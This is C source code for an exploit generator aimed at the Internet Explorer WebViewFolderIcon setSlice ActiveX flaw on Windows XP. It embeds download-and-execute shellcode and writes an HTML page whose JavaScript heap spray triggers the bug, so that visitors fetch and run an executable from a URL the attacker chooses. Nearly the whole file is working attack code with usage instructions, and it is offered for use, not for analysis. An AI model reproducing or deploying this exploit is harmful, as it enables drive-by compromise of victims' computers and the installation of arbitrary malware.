/*
*-----------------------------------------------------------------------
*
* Microsoft Internet Explorer WebViewFolderIcon (setSlice) Exploit (0day)
*	Works on all Windows XP versions including SP2
*
*	Author: LukeHack 
*	Mail: lukehack@fastwebnet.it
*
*	Bug discovered by Computer H D Moore (http://www.metasploit.com)
*
*	Credit: metasploit, jamikazu, nop (for the shellcode)
*
*          :
* Tested   : 
*          : Windows XP SP2 + Internet Explorer 6.0 SP1 
*          :
* Complie  : cl pociewvf.c
*          :
* Usage    : c:\>pociewvf
*          :
*          :Usage: pociewvf <exe_URL> [htmlfile]
*          :
*          
*          
*------------------------------------------------------------------------
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

FILE *fp = NULL;
char *file = "lukehack.htm";
char *url = NULL;

// Download Exec Shellcode by nop
unsigned char sc[] =     
"\xe9\xa3\x00\x00\x00\x5f\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b"
"\x70\x1c\xad\x8b\x68\x08\x8b\xf7\x6a\x04\x59\xe8\x43\x00\x00\x00"
"\xe2\xf9\x68\x6f\x6e\x00\x00\x68\x75\x72\x6c\x6d\x54\xff\x16\x95"
"\xe8\x2e\x00\x00\x00\x83\xec\x20\x8b\xdc\x6a\x20\x53\xff\x56\x04"
"\xc7\x04\x03\x5c\x61\x2e\x65\xc7\x44\x03\x04\x78\x65\x00\x00\x33"
"\xc0\x50\x50\x53\x57\x50\xff\x56\x10\x8b\xdc\x50\x53\xff\x56\x08"
"\xff\x56\x0c\x51\x56\x8b\x75\x3c\x8b\x74\x2e\x78\x03\xf5\x56\x8b"
"\x76\x20\x03\xf5\x33\xc9\x49\x41\xad\x03\xc5\x33\xdb\x0f\xbe\x10"
"\x3a\xd6\x74\x08\xc1\xcb\x0d\x03\xda\x40\xeb\xf1\x3b\x1f\x75\xe7"
"\x5e\x8b\x5e\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5e\x1c\x03\xdd\x8b"
"\x04\x8b\x03\xc5\xab\x5e\x59\xc3\xe8\x58\xff\xff\xff\x8e\x4e\x0e"
"\xec\xc1\x79\xe5\xb8\x98\xfe\x8a\x0e\xef\xce\xe0\x60\x36\x1a\x2f"
"\x70";    

char * header =
"<html>\n"
"<body>\n"
"<script>\n"
"\tvar heapSprayToAddress = 0x05050505;\n"
"\tvar shellcode = unescape(\"%u4343\"+\"%u4343\"+\"%u4343\" + \n";

// Change this script by yourself.
char * footer =
"var heapBlockSize = 0x400000;\n"
"var payLoadSize = shellcode.length * 2;\n"
"var spraySlideSize = heapBlockSize - (payLoadSize+0x38);\n"
"var spraySlide = unescape(\"%u0505%u0505\");\n"
"spraySlide = getSpraySlide(spraySlide,spraySlideSize);\n"
"heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;\n"
"memory = new Array();\n\n"
"for (i=0;i<heapBlocks;i++)\n{\n"
"\t\tmemory[i] = spraySlide + shellcode;\n}\n"
"for ( i = 0 ; i < 128 ; i++)\n{\n\t"
"try\n\t{\n\t\tvar tar = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');\n"
"\t\ttar.setSlice(0x7ffffffe, 0x05050505, 0x05050505,0x05050505 );\n" 
"\t}\n\tcatch(e){}\n}\n\n"
"function getSpraySlide(spraySlide, spraySlideSize)\n{\n\t"
"while (spraySlide.length*2<spraySlideSize)\n\t"
"{\n\t\tspraySlide += spraySlide;\n\t}\n"
"\tspraySlide = spraySlide.substring(0,spraySlideSize/2);\n\treturn spraySlide;\n}\n\n"
"</script>\n"
"</body>\n"
"</html>\n";

// print unicode shellcode
void PrintPayLoad(char *lpBuff, int buffsize)
{
   int i;
   for(i=0;i<buffsize;i+=2)
   {
       if((i%16)==0)
       {
           if(i!=0)
           {
               printf("\"\n\"");
               fprintf(fp, "%s", "\" +\n\"");
           }
           else
           {
               printf("\"");
               fprintf(fp, "%s", "\"");
           }
       }
           
       printf("%%u%0.4x",((unsigned short*)lpBuff)[i/2]);
       
       fprintf(fp, "%%u%0.4x",((unsigned short*)lpBuff)[i/2]);
     }
     

       printf("\";\n");
       fprintf(fp, "%s", "\");\n");          
   
   
   fflush(fp);
}

void main(int argc, char **argv)
{
   unsigned char buf[1024] = {0};

   int sc_len = 0;


   if (argc < 2)
   {
      printf("Microsoft Internet Explorer WebViewFolderIcon (setSlice) Exploit (0day)\n");
      printf("Code by LukeHack\n");
      printf("\r\nUsage: %s <URL> [htmlfile]\r\n\n", argv[0]);
      exit(1);
   }
   
   url = argv[1];
   

    if( (!strstr(url, "http://") &&  !strstr(url, "ftp://")) || strlen(url) < 10)
    {
        printf("[-] Invalid url. Must start with 'http://','ftp://'\n");
        return;                
    }

      printf("[+] download url:%s\n", url);
      
      if(argc >=3) file = argv[2];
      printf("[+] exploit file:%s\n", file);
       
   fp = fopen(file, "w");
   if(!fp)
   {
       printf("[-] Open file error!\n");
          return;
   }    
   
   fprintf(fp, "%s", header);
   fflush(fp);
   
   memset(buf, 0, sizeof(buf));
   sc_len = sizeof(sc)-1;
   memcpy(buf, sc, sc_len);
   memcpy(buf+sc_len, url, strlen(url));
   
   sc_len += strlen(url)+1;
   PrintPayLoad(buf, sc_len);
 
   fprintf(fp, "%s", footer);
   fflush(fp);  
   
   printf("[+] exploit write to %s success!\n", file);
}

// LukeHack coded it!
